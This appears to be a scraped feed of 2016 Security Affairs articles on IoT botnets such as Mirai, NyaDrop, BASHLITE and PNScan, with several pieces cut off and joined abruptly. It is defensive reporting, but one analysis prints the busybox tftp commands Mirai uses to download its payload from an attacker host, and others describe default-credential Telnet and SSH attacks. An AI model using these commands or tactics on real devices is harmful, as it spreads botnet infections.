cases, the received attacks are automatic, so, if your router is in the cybercriminal range you could be a potential victim. The typical excuse \u201cI am nobody\u201d is not valid. You only need to be on the range \u2013 it doesn\u2019t need to be an personal attack. The greater the number of potential victims greater the percentage of success.\n\nTo recollect all this events and cyberattacks, I usually use a sensor to redirect all the traffic that goes to my public IP that corresponds to my own router. I monitor all incoming activity in TCP and UDP range. I also monitor ICMP packets. I consider as suspicious every traffic addressed to my IP and I follow any attempt of connection to my TCP port.\n\nKeep in mind that an IP address of a possible attacker by itself is not a relevant fact, since you can use different techniques to hide the real IP source or even the attacker can use a device already breached for his attack through him. At no time did I spread my IP address to receive attacks.\n\nData collection occurred between Wednesday, October 6 at 6PM and Thursday, October 24 at 6PM.\n\nOnce data collection time have finished, I present you the results:\n\n\n\nIn 24 hours they produced a total of 20,070 events to my home router, which I consider as 4678 attacks. There has been a total of 92 different countries from which connections have received a total of 349 different ports.\n\nMore than half of the events were received from Asia. Among the ports that have received more connections, we highlight the SSH, Telnet, 443, 2323, RDP, VNC, 8080 among other services. If I ever have published that my services were exposed, we could ask ourselves what they are looking for and how they found me. We can know it if we perform an analysis of everything that has occurred.\n\n\n\nAmong the origins of events, it is normal lately find Vietnam on top. The answer to this can be found in details in the following article: http://securityaffairs.co/wordpress/52015/hacking/mirai-botnet.html\n\nIt happens due to a large number of infected IOT devices with MIRAI that have among their targets Spanish IP.\n\n \n\nThe graph above shows the traffic received from attacks (not all the events) during these 24 hours of analysis (Origin country, ASN, IP and port):\n\n\n\nSome highlights countries by the number of attacks carried out (A, IP, and Port):\n\n  \n\nMost of the attacks have received European and Asian origin. We have also received a small share of attacks from Spain.\n\n \n\n\n\nAnalyzing some of the IPs that have attacked my router I could find the following web administration panels corresponding to cameras and routers:\n\n \n\n \n\nSome of them do not need credentials for access and others have default credentials. They have visited my router (or perhaps any team behind that network), are connected to my decoy ports have downloaded malware samples have tried to include me in their botnet, they have used my gateway for attacks, including other activities.\n\nThere have been downloaded several samples of malware, including Mirai:\n\n\n\nBut it has not been the only malware that has tried to download. You can see below the demonstration of the large number of downloads using Wget that have attempted:\n\nOnce all the data were observed, you should ask yourself if your home router could be attacked or not. Don\u2019t ask if it was attacked or not: ask when it will be. Thinking about the information presented in this article, maybe you are a little more aware that it will happen to you soon or later. I hope this time you have not your router exposed, have your credentials too weak and have exposed more information than necessary. Maybe you\u2019ve already been attacked and still don\u2019t know.\n\nIf you do not have these tips in mind, perhaps your IP address would appear on the next list.\n\nBest regards.\n\nThese one and more articles are available at www.fwhibbit.es\n\nMy talk about honeypots:\n\n\n\nTwitter: @0fjrm0\n\nAbout the author: Francisco J.

It\u2019s definitely a worrying trend seeing the DDoS capabilities grow,\u201d Daniel Cohen, head of the RSA\u2019s FraudAction business unit, told Forbes.\n\nAccording to RSA the hackers advertised an IoT botnet that is able to power DDoS attack with a 1 Tbps of traffic, the same volume of traffic that flooded the French hosting provider OVH. It is not clear if the botnet was composed of devices infected by the Mirai malware.\n\nThe hackers were offering a botnet composed of 50,000 devices for $4,600, meanwhile 100,000 bots the price is $7,500.\n\n\n\nCohen clarified that RSA has no evidence that the botnet is linked to infrastructure that hit the Dyn DNS service on Friday.\n\n\u201cHackers have long sold access to botnets, though haven\u2019t explicitly advertised their use of IoT devices like connected cameras, fridges and kettles.

Who his behind the attack?\n\nThe fear of cyber attack on a global scale brought people in the panic, yesterday a large portion of users have probably understood that the Internet architecture is a resource that could be targeted by hackers with serious and unpredictable consequences.\n\nBut how the attack happened? What\u2019s the cause behind the attack?\n\nWe still ignore the exact dynamic of the attack, neither who is the responsible, the unique certainty is that the Dyn DNS Service was flooded by a devastating wave of requests originated by million of compromised IoT devices. The Dyn company reported a huge army of hijacked Internet of Things devices could be abused by attackers to power the massive DDoS attack.\n\nThe security intelligence firm Flashpoint published an interesting post on the massive DDoS in which confirm that its experts have observed the Mirai bots driving the attack against DynDNS.\n\n\u201cFlashpoint has confirmed that some of the infrastructure responsible for the distributed denial-of-service (DDoS) attacks against Dyn DNS were botnets compromised by Mirai malware.

The malware, dubbed \u2018Mirai\u2019 spreads to vulnerable devices by continuously scanning the Internet for IoT systems protected by factory default or hard-coded usernames and passwords.\u201d reported Krebs.\n\n\n\nThe Mirai Botnet was first spotted by the researcher MalwareMustDie this summer targeting IoT devices, it mainly targets connected objects such as routers, CCTV, and DVRs.\n\nThe Mirai malware target Internet of Things (IoT) devices using the credential factory settings, a circumstance that is quite common in the wild.\n\nThe availability of the source code of Mirai Botnet in the wild theoretically made possible everyone to power a botnet.\n\nI confess you that I believe the leak of the source code of such kind of botnet could be also part of a wider strategy of a certain category of attackers that intend to power massive attacks making impossible the attribution.\n\nWatch out! The Mirai botnet that powered the attack against the Dyn DNS service is not the same used against Krebs\u2019s site and OVH.\n\n\u201cWhile Flashpoint has confirmed that Mirai botnets were used in the October 21, 2016 attack against Dyn, they were separate and distinct botnets from those used to execute the DDoS attacks against \u201cKrebs on Security\u201d and OVH. Earlier this month, \u201cAnna_Senpai,\u201d the hacker operating the large Mirai botnet used in the Krebs DDoS, released Mira\u2019s source code online.\u201d continues Flashpoint \u201cSince this release, copycat hackers have used the malware to create botnets of their own in order to launch DDoS attacks.\u201d\n\nIt is unknown if the attacks against Dyn DNS are linked to the DDoS attacks against Krebs, OVH, or other previous attacks.\n\nThe attack against a DNS aims to obtain a wide effect, in the specific case many sites and services are using Syn as their upstream DNS provider.\n\nIf you are interested to know more about the diffusion of the Mirai Botnet you can use this online tracker that reports more than 1.2 Million IPs seen associated to devices infected by the Mirai code in the wild. Consider that isn\u2019t the exact number of infected devices, because many of them use dynamic IPs.\n\n\n\n \n\nAccording to the Reuters, the US Department of Homeland Security (DHS) and the FBI are both investigating the massive DDoS attacks against the Dyn DNS service.\n\nWe have no indication about the possible culprit, I personally believe that the leakage of the Mirai botnet in the wild and this last massive attack have something in common and there is a specific strategy of a persistent attacker behind the events.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Dyn DNS service, massive DDoS)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dyn-dns-service", "topic_name": "Dyn DNS Service"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/massive-ddos", "topic_name": "massive DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai", "topic_name": "Mirai"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}]}, {"news_name": "The Mirai botnet is targeting also Sierra Wireless cellular data gear products", "news_link": "https://securityaffairs.co/wordpress/52313/iot/sierra-wireless-mirai.html", "title": "The Mirai botnet is targeting also Sierra Wireless cellular data gear products\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 16, 2016", "body": "Sierra Wireless is warning its customers to change factory credentials of its AireLink gateway communications product.\n\nThe company is aware of a significant number of infections caused by the Mirai malware, a threat specifically designed to compromise poorly configured IoT devices.\n\nThe malware was first spotted in August by MalwareMustDie have analyzed samples of this new ELF trojan backdoor.

We have to remember that often the web-ip-cam, DVR/NVR, routers/modems are deployed without changing the default credentials.\n\nOnce the NyaDrop succeeded to connect \u2013 using Telnet protocol \u2013 to the IoT device infect the system dropping (downloading) in the guest host the real NyaDrop binary code: that\u2019s why the size of NyaDrop initially is a small executable file.\n\nFigure 1: strings contained in the binary code of NyaDrop\n\nFrom the NyaDrop binary is not possible to extract too many strings except \u201cnyABa\u201d and from this the codename \u201cNya\u201d. This string anyway is \u201ca good way to grep for the easy filtration or one of the conditions in filtering this malware version for the mitigation purpose / signature.\u201d\n\nBut let\u2019s give a look to the binary code of the malware.\n\n\u201cIf you see the size, we are dealing with a small executable file. It\u2019s a clean libc compiled ELF from coded in C in such form that we see much in shellcodes. Insides are filled with the MIPS opcodes. We dealt before with the similar small ELF malware before in the following posts in here [link] and here [link], I will try to deal with this one too :)\u201d\n\nFigure 2: The NyaDrop ELF\n\n \n\nSmall size yes? But it is amazing to see what this small malicious ELF can do..\n\nIn the MalwareMustDie analysis, the experts confirms that NyaDrop then will try to connect from the infected device to the C&C host in order to download the Nya trojan if the IoT device uses \u201cMIPS CPU architecture, implying routers and similar networking devices, with 32bit clock. \u201c\n\nMIPS-based CPUs are often found within devices such as routers, DVRs, CCTV cameras, and other embedded systems, as we mentioned above.\n\nSo we have here a very selective environment malware and this means that the NyaDrop author didn\u2019t want to attack any IoT platform, but on the contrary, he wanted to avoid infecting \u201cuseless\u201ddevice: to target the best devices with the most powerful bandwidth, and avoiding to \u201cdrop\u201d on incompatible system the precious binary code that could be unable to be executed.\n\nThe interview of @unixfreaxjp from MalwareMustDie in exclusive for Security Affair about Linux/NyaDrop\n\nBut let\u2019s go to the interview with MalwareMustDie.\n\nQ: What makes the sighting of NyaDrop is so low, even maybe some seen the attacks/efforts to infect?\n\nA: We can summarize those key points:\n\nQ: Why do you think he is asking MIPS architecture in your case? How the herder made effort for the infection in that architecture?\n\nA: I am not sure why, but obviously, next to ARM, MIPS devices are plenty on the internet, especially the networking boxes such as gateways, routers, switch, modems etc. He made hard effort, to make the binary as small as possible with a limited set of buffer size, you can see it in the reversing part I made. The total binary size is 621 bytes, with the complete functionalities using syscalls (socket, connect, recv, open, write, close), NyaDrop was designed as backdoor to be pwn tools of routers.\n\nQ: How do you think the effectively in using Telnet to inject/install Nyandrop to the targeted machine?\n\nA: It\u2019s only if you know Telnet flaw of the device or hardcoded pwd then one are aiming this sector. In this season, we have about 2million device with Telnet running on the internet, the effectivity to aim this protocol to gain shell privilege is fairly high. The way the coder inject the binary using echo commands it\u2019s not smart and can raise a risk to break  some shell on handling those data, this is also why the successfully injected binary spotted is low.\n\nSorry, but I am not going to suggest the best way for do this.\n\nQ: You mentioned it was originated in Russia, why?\n\nA: Seeing the way it is coded & compiled, it is good, it trimmed the ELF into the minimum running state\u2026 it is very hard to imagine that skiddies that we know is having such knowledge. \n\nI investigated deeper the source IP used, such connection will not be easily contracted by westerners.\n\n \n\nQ: Do you think it is a new concept to infect IoT using the dropper/injector backdoor like Linux/NyaDrop?\n\nA: For the malware, the concept is not new, for IoT it is new since IoT was never being aimed as hard as now also.

The name of the malware is the same of the binary,\u201dmirai.*,\u201d and according to the experts, several attacks have been detected in the wild.\n\nThe ELF Linux/Mirai is very insidious; it is still undetected by many antivirus solutions as confirmed by the very low detection ratio in the VirusTotal online scanning service.\n\n\u201cThe reason for the lack of detection is because of the lack of samples, which are difficult to fetch from the infected IoT devices, routers, DVR or WebIP Camera, the Linux with Busybox binary in embedded platform, which what this threat is aiming.\u201d states the analysis from MalwareMustDie Blog.\n\nThe last ELF examined by Security Affairs was the Linux Trojan Linux.PNScan that has actively targeting routers based on x86 Linux in an attempt to install backdoors on them.\n\nBut MalwareMustDie tells us that Linux/Mirai \u201cis a lot bigger than PnScan\u201d.\n\nAnd continues: \u201cThe threat was starting campaign in early August even if this ELF is not easy to be detected since it is not showing its activity soon after being installed: it sits in there and during that time, no malware file will be left over in system, all are deleted except the delayed process where the malware is running after being executed.\u201d\n\nThis means that when the infections succeeded, it is not easy to distinguish an infected system by a not infected one, except than from the memory analysis, and we are talking about a kind of devices that are not easy to analyze and debug. The normal kind of analysis conducted from the file system or from the external network traffic doesn\u2019t give any evidence, at the beginning.\n\nWe are in a hostile environment, called Internet of Things (IoT), shaping new kind of powerful Botnets spreading worldwide, but which Countries are more exposed to this kind of attack?\n\n\u201cCountries that are having Linux busybox IoT embedded devices that can connect to the internet, like DVR or Web IP Camera from several brands, and countries who have ISP serving users by Linux routers running with global IP address, are exposed as target, especially to the devices or services that is not securing the access for the telnet port (Tcp/23) service\u201c\n\nIn fact seems that he continues, \u201cthe Linux/Mirai creators succeed to encode the strings and making diversion of traffic to camouflage themself. As is possible to see analyzing the samples, shown in the link to Virustotal  the best detection is only \u201c3 of 53\u201d or \u201c3 to 55.\u201d\n\nWhat is very important for all the sysadmins is to be provided by a shield against these infections: \u201calong with the good friends involved in the open filtration system, security engineers are trying to push\u201d \u2013 says again MalwareMustDie \u2013 \u201cthe correct filtration signature to alert the sysadmins if having the attacks from this threat. And on one pilot  a sysadmins provided with the correct signatures, found the source attack from several hundreds of addresses within only a couple of days.\u201d\n\nThen it seems that the infection is really going widespread and the Botnet seems to be really very large.\n\nAt the moment for all the sysadmins who want to protect their systems there is a list of mitigations actions:\n\nBut, what we know about this Linux/Mirai ELF malware exactly, and why it is not so common among the malware analysts?\n\n\u201cThe reason why not so many people know it\u201d, says MalwareMustDie \u2013 \u201cis that antivirus thinks it is a variant of Gafgyt or Bashlite or Bashdoor. Then, the real samples of this malware is hard to get since most malware analysts have to extract it from memory on an infected device, or maybe have to hack the CNC to fetch those.\u201d\n\nThis means that also the forensic analysis can be difficult if we switch off the infected device: all the information would be lost and maybe it would be necessary start again with a new infection procedure, in case. It remembers the Greek mobile wiretap named \u201cVodafone Hack\u201d, no evidence than in the memory.\n\nBut in your opinion which is the main difference among the previous ELF malware versions?\n\n\u201cThe actors are now having different strategy than older type of similar threat.\u201d \u2013 says MalwareMustDie \u2013 \u201cby trying to be stealth (with delay), undetected (low detection hit in AV or traffic filter), unseen (no trace nor samples extracted), encoded ELF\u2019s ASCII data, and with a big \u201chush-hush\u201d among them for its distribution. But it is obvious that the main purpose is still for DDoS botnet and to rapidly spread its infection to reachable IoTs by what they call it as Telnet Scanner. \u201d\n\nThe real insidiously of this ELF is that the only way to track it is to extract it from the memory of the running devices and there is not so much expertise among people that can \u201chack their own routers or webcam or DVR to get the malware binary dumped from the memory or checking the trace of infection.\u201d\n\nDigging in the details: how the infection works.\n\nAttackers hacked IoT devices via SSH or Telnet account exploiting known vulnerabilities or using default passwords that were not changed by the owner of the targeted systems.\n\n\n\nAs we read in the last post on the MalwareMustDie blog, this kind of ELF uses a specific technique to fork into a new process if the conditions of the infection of the current device are targeted, otherwise the node is safe and the installation does not go on.\n\nOnce gained a shell access on the device, the attackers will download the payload of the ELF Linux/Mirai malware, below an example of the command launched on an IoT device to perform the operation:\n\n\u2018busybox tftp\u2018 -r [MalwareFile] -g [IPsource]\n\u2018busybox tftp\u2018 -g -l \u2018dvrHelper\u2019 -r [MalwareFile] [IPsource]\n\nIt was very difficult to analyze the Linux/Mirai infection because once executed the malware is also able to delete traces of its presence.\n\n\u201cIn some cases of the Linux/Mirai infection is showing traces that the malware was executed without parameter and there are cases where the downloaded malware file(s) is deleted after execution. In this case, mostly you won\u2019t get the samples unless you dump the malware process to the ELF binary. This explains it is hard to get the good working samples for this new threat.\u201d continues the MalwareMustDie team.\n\n\u201cUpon execution the malware will be self-deleted to avoid the trace, but the process is running. In some IoT that can be seen in lsof or the list to the /proc with specific PID, i.e.:\u201d\n\n/proc/{PID}/exe -> \u2018/dev/.{something}/dvrHelper\u2019 (deleted) \n/proc/{PID}/exe -> \u2018./{long alphabet strings}\u2019 (deleted)\n\nWhile the process runs, the malware opens the PF_INET, a UNIX networking socket for TCP, and binds it to the port TCP/48101 from localhost IP address 127.0.0.1 and then starting to listen to the incoming connection. The malware forks to a new process with a new process PID,  \u201cthe infected device will perform connection on telnet services on other devices for the further abuse purpose.\u201d\n\nThe experts also provided a way to reverse a running process with a tool that will go open-source: for the details, enjoy the analysis.\n\nAbout the Author: Odisseus\n\nIndependent Security Researcher involved in Italy and worldwide in topics related to hacking, penetration test and development.\n\nCo-Author Pierluigi Paganini\n\n(Security Affairs \u2013 Linux Mirai malware, IoT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/camera", "topic_name": "camera"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dvrs", "topic_name": "DVRs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/linux", "topic_name": "LINUX"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}]}, {"news_name": "BASHLITE Botnets peaked 1 Million Internet of Thing Devices", "news_link": "https://securityaffairs.co/wordpress/50824/iot/bashlite-botnets.html", "title": "BASHLITE Botnets peaked 1 Million Internet of Thing Devices\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 1, 2016", "body": "Do you remember the BASHLITE malware? It was a strain of malware (also known as Lizkebab, Torlus and Gafgyt) detected by experts at Trend Micro shortly after the public disclosure of the ShellShock bug.\n\nThe BASHLITE malware includes the code of the ShellShock exploit and it had been used by threat actors in the wild to run distributed denial-of-service (DDoS) attacks.\n\nIt could infect multiple Linux architectures, for this reason, crooks used it to target Internet of Things devices.\n\nIn June, experts from the security firm Sucuri spotted a botnet composed of tens of thousands of CCTV devices that had been used by crooks to launch DDoS attacks against websites.\n\nThe BASHLITE source code was leaked online in early 2015, malware developers used it to create their own variant.\n\nNow experts from Level 3 and Flashpoint confirmed the overall number of devices infected by the BASHLITE malware is more than 1 million.\n\nThe number includes compromised devices belonging to several botnets, according to the experts, almost every infected device are digital video recorders (DVRs) or cameras (95%), the remaining is composed of routers (4%), and Linux servers (1%).\n\n\u201cOf the identifiable devices participating in these botnets, almost 96 percent were IoT devices (of which 95 percent were cameras and DVRs), roughly 4 percent were home routers and less than 1 percent were compromised Linux servers. This represents a drastic shift in the composition of botnets compared to the compromised server- and home router-based DDoS botnets we\u2019ve seen in the past.\u201d states a blog post published by Level 3 firm.\n\nThe researchers have been tracking more than 200 C&C worldwide used by the BASHLITE botnets. Fortunately, the IP addresses of the C&C servers was found hardcoded in the instance of malware detected in the wild making easy for experts to shut down them.\n\nThe researchers provided interesting details about the Global Distribution of the gafgyt Bots, the vast majority of infected devices are located in Brazil, Taiwan and Colombia.\n\n\u201cOf the bots we\u2019ve observed participating in attacks, peaking at more than 1 million devices, a large percentage are located in Taiwan, Brazil and Colombia. A large majority of these bots were using white-labeled DVRs generically described as \u201cH.264 DVRs\u201d and DVRs manufactured by the company Dahua Technology.\u201d continues the post. \u201cWe have contacted Dahua Technology to make them aware of this issue. Our investigation shows more than one million of these two types of devices are accessible on the internet, providing a large pool of potential bots.\u201d\n\n\n\nIt is quite easy for hackers to compromise DVRs that are affected by multiple critical vulnerabilities. In many cases, the same flawed software is used by multiple vendors for their devices.\n\n\u201cMost of these devices run some flavor of embedded Linux.

This worm is more aiming embed platform and I am a bit surprised to find i86 binary is hitting some Linux boxes.\u201d states the analysis published by Malware Must Die! \n\n\u201cThis threat came to MalwareMustDie ELF team task before and I posted analysis in Mon Sep 28, 2015 on kernelmode [link] along with its details and threat, I thought the threat is becoming inactive now and it looks like I\u2019m wrong, as the malware works still in infection now as worm functions and is hardcoded to aim 183.83.0.0 / 16 segment (located in network area of Telangana and Kashmir region of India), where it was just spotted. Since I never write about this threat in this blog (except kernelmode), it will be good to raise awareness to an active working and alive worm.\u201d\n\nThe new strain of Linux.PNScan.2, unlike the original variant Linux.PNScan.1, which attempted to brute force router login using a special dictionary, the new threat targets specific IP addresses and attempts to establish an SSH connection by using the following credentials:combinations:\n\n\n\nThe new Linux.PNScan.2 was compiled on compatibility of GCC(GNU) 4.1.x via the compiler tool Toolchains with cross compiler option for i686 using the SSL enabled configuration.\n\nWhen the threat infects a device, it will fork its process 4 times, creating certain files on the infected system, daemonizing and listening to 2 TCP ports, targeting hardcoded IPs, and sending HTTP/1.1 requests via SSL to twitter.com on port 443 to hide its malicious traffic.\n\nAs its predecessor, also this variant can brute forcing logins.\n\nThe malware researchers who analyzed the threat suggest it might be of Russian origin.\n\n\u201cI guess this happened from 6 months ago until now, and the hacker is sitting there in Russia network for accessing any accessible infected nodes.\u201d continues the analysis.\n\nThe experts from Malware Must Die! also published a list of infection symptoms, routers have specific processes running in the initial stage of the infection, the launched attack can be seen in the network connectivity, each connected target is logged in the \u201clist2\u201d file and the brute list is traced in file \u201clogin2.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Linux malware, Linux.PNScan)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor", "topic_name": "backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/linux-pnscan", "topic_name": "Linux.PNScan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/router", "topic_name": "Router"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "IoT \u2013 Shocking : How your home sockets could aid in Cyber attacks", "news_link": "https://securityaffairs.co/wordpress/50545/iot/iot-home-sockets-vulnerable.html", "title": "IoT \u2013 Shocking : How your home sockets could aid in Cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 23, 2016", "body": "I love some of the gangster nicknames people come up with. Knuckles, Fat Tony , Stab Happy or even Bambi. Names are characteristic of their personality and attitude. It\u2019s time to add Toaster Socket to the name as in the age of Smart Grid, criminals are getting updated.\n\nThe Internet of Things (IoT) ,which soon may become the \u201cInternet of Everything,\u201d is something that has made every security professional reanalyse all his security strategies. Security has been a challenge when it came to handling our basic Information and Communication Technology (ICT) systems. With the disruptive and highly welcomed IoT age upon us we may soon have larger challenges.\n\nA recent research by Bitdefender found that smart electrical sockets can be exploited easily and be made a zombie on a bot network.\n\n\u201cThe vulnerable device is a smart electrical switch that plugs into any wall socket and enables users to schedule a connected electronic device on and off from their smartphone. It can power any gadget \u2013 thermostats, smart TVs, coffee makers, security cameras, garage doors, and medical devices and so on.\u201d states BitDefender.\n\n\n\nFor those who know the challenges an enterprise can face while fending off attacks from such botnets, would realize we are adding ammunition to the cyber criminal\u2019s arsenal.\n\nOther than exploiting the inbuilt Operating System to execute commands it can affect the user by gaining access to his email, gain login credentials to his other wireless systems, cause overheating and hence create fire \u201caccidents\u201d . The possibilities are endless.\n\nElectrical and electronic appliances have had their recent fair share of negative media when it comes to being actors in cyber attacks. Surveillance cameras could be recruited in powerful botnets, smart LED light bulbs giving away WiFi passwords or refrigerators launching DDoS attacks.\n\nA common issue found in the power outlet by security researchers is the lack of robust password and username  combination security strength, the lack of encrypted configuration mechanism when joining your personal network (Eg.: Home WiFi network)and weak encoded information sharing between vendor servers and appliance.\n\nBased on the above discoveries Bitdefender outlined some ways of launching attacks and compromising your system where the attack vector is your smart socket.\n\nWell coming to the meat of the matter, an attacker always wants to gain root access to a system . These few stated methods and a little effort could give them that. Hence your socket may end up being weaponized for cyber attacks, be used to monitor and harm you (the user) , gain access to other systems in your network and a major overlooked issue affect your privacy.\n\nThe solution is evident.

With telecommunications firms on board, manufacturers are coming up with new, innovative uses for everyday objects. Yet linking these everyday objects to a wider network out there creates new security risks.\n\nHow do you cope with the massively increased flow of data that the Internet of Things requires? At the moment there are already a forecasted amount of 6.4 billion connected objects, but as this technology takes off this number will easily reach into the 11 billion by 2020. As a result, some new priorities are beginning to emerge.\n\n\n\nSecurity begins with the object\n\nWhen a staggering volume of new objects become connected to the internet, some form of security must be built in at the manufacturing level. This is a shift that\u2019s one of the first major new priorities for the IoT. The shift will most likely move in stages, with the web service focused on first as a security barrier. Cloud security is also important to think about. Yet as IoT innovation from Nokia Networks and other providers continues to develop, the security will eventually become embedded directly into the object.\n\nSecuring data en route \n\nAnother area where security experts will need to focus is in the route that data takes from the object to the internet. There\u2019s a far greater burden on IT departments with the growth of the IoT, as they must now track exponentially increasing volumes of data. Endpoint security is often focused on, but these mass flows of data must also be secured during transport as a new priority. Data is currently sent to a local data collation hub in many cases, where it is stored before it\u2019s moved on to the next end point. These midway storage points must be secured just like the end points. Securing the endpoints is still important however, as is educating end users who may pose the biggest security risk.\n\nPrivacy issues \n\nPrivacy is another major security issue to consider with the growth of the IoT. Naturally, privacy concerns are already a core issue with cloud systems, but this will grow as every person and object starts transmitting data. Objects will constantly be collecting and aggregating data in real time, which must be stored securely for review.\n\nSystems will need to be put into place to determine how to best delete this data when it is no longer needed. Useful connected objects like health monitors will store sensitive information about consumers, for example. This is a major component of the security puzzle that needs to be addressed before the IoT can become mainstream.\n\nIncreasing Security Spending\n\nWith everything from industrial machinery to consumer vehicles connected to the web, the consequences of a security breach could be serious. As the IoT becomes increasingly complex over the next few years, stretching out to become a technology in every individual\u2019s home, directing entire smart cities, the consequences of an attack could be considerable. To combat this, IoT security spending has increased rapidly to match the technology\u2019s growth. A recent Gartner report stated that worldwide spending will reach $547 million in 2018, up from $348 million this year and $281.5 million in 2015.\n\nThe growth of this new technology will offer society numerous benefits, but it\u2019s important to think about embedding security right from the start. Identifying these priorities and increasing security spending accordingly is a good start.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 security, Internet of Things)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet-of-things", "topic_name": "Internet of Things"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/privacy", "topic_name": "privacy"}]}, {"news_name": "Sucuri spotted a large botnet of CCTV devices involved in DDoS attacks", "news_link": "https://securityaffairs.co/wordpress/48807/iot/cctv-devices-ddos.html", "title": "Sucuri spotted a large botnet of CCTV devices involved in DDoS attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 28, 2016", "body": "Researchers have encountered a denial-of-service botnet that\u2019s made up of more than 25,000 Internet-connected closed circuit TV devices.\n\nWe discussed several times about the IoT and the lack security by design that makes smart objects a privileged target of hackers. The researchers from Sucuri Security firm have spotted a malicious botnet composed of more than 25,000 Internet-connected closed circuit TV devices (CCTV) that has been used in denial-of-service attacks.\n\nThe company was trying to repel a DDoS attack against a small brick-and-mortar jewelry shop that was hit by almost 35,000 HTTP requests per second. The volume of requests reached 50,000 HTTP requests per second after the company tried to mitigate the attack.\n\nThe DDoS attack continued for several days, the CCTV botnet used addresses located in more than 105 countries around the world.\n\n\u201cIt is not new that attackers have been using IoT devices to start their DDoS campaigns, however, we have not analyzed one that leveraged only CCTV devices and was still able to generate this quantity of requests for so long.\u201d explained Daniel Cid in a blog post. \u201cAs we extracted the geo-location from the IP addresses generating the DDoS, we noticed that they were coming from all over the world, different countries and networks. A total of 25,513 unique IP addresses came within a couple of hours. The source of the attack concentrated in Taiwan, with 24% of the IP address, followed by the USA with 12%, Indonesia with 9%, Mexico with 8% and Malaysia with 6%.\u201d\n\n\n\nThe experts from Sucuri investigated a number of CCTV boxes involved in the DDoS attack and discovered that all of them were running the \u201cCross Web Server\u201d and that the devices leveraged on a BusyBox. The BusyBox is a software that provides several Unix tools in a single executable file, it is specific embedded in operating systems, including CCTV. Many routers and other network appliances run the software to advantage maintenance activities. In November 2014, experts from Trend Micro spotted a new variant of the BASHLITE malware exploiting the ShellShock vulnerability to infect devices that were using the BusyBox software.\n\n\u201cAs we dug deeper into each of these IP addresses, we learned that all of them were running the \u201cCross Web Server\u201d and had a similar default HTTP page with the \u201cDVR Components\u201d title.\n\nThis is what raised our suspicious of a IoT botnet that was leveraging some CCTVs as part of the attack. As we kept looking, we found the company logos from the resellers and manufactures on all IP addresses.\u201d continues the analysis.\n\nThe experts noticed that to make it harder to neutralize the DDoS attack, the CCTV had been programmed to emulate normal browser behavior by displaying a variety of common user agents including the ones associated with the most popular browsers:\n\nThe CCTV devices belonging to the botnet also displayed \u201creferrers\u201d showing they had most recently visited sites including Engadget, Google, and USA Today.\n\nHow Did crooks recruit the CCTV devices?\n\nIt is likely they exploited a recently disclosed vulnerability that allows remote code execution on digital video recorders from 70 different manufacturers.\n\nIt isn\u2019t the first time that experts found IoT botnet in the wild. Security experts at Imperva\u2019s Incapsula raised a first warn about closed-circuit television (CCTV) botnet attacks in March 2014, explaining that crooks could exploit the lack of security by design and incorrect configurations. For example, it is quite easy to find online specific models of CCTV cameras working with factory settings, including well-known passwords.\n\nOne year later Imperva published a new post on the topic revealing that CCTV cameras have been abused to run a major DDoS attack that peaked at 20,000 requests per second. The experts explained that threat actors behind the attack relied on nearly 900 CCTV cameras running embedded versions of Linux and the BusyBox toolkit.\n\n\u201cNot surprising, given that CCTV cameras are among the most common IoT devices. Reports show that in 2014, there were 245 million surveillance cameras operating around the world\u201d states a blog post from the company. \u201d\n\n\u201cStill, old foes have the capacity to surprise, as we were recently reminded, when one of our clients was targeted by repeated HTTP flood attacks. The attack was run of the mill, peaking at 20,000 requests per second (RPS). The surprise came later when, upon combing through the list of attacking IPs, we discovered that some of the botnet devices were located right in our own back yard.\u201d\n\nThe experts that analyzed the compromised CCTV cameras confirmed that most of them were accessed via their default login credentials.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 CCTV cameras, cybercrime)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": 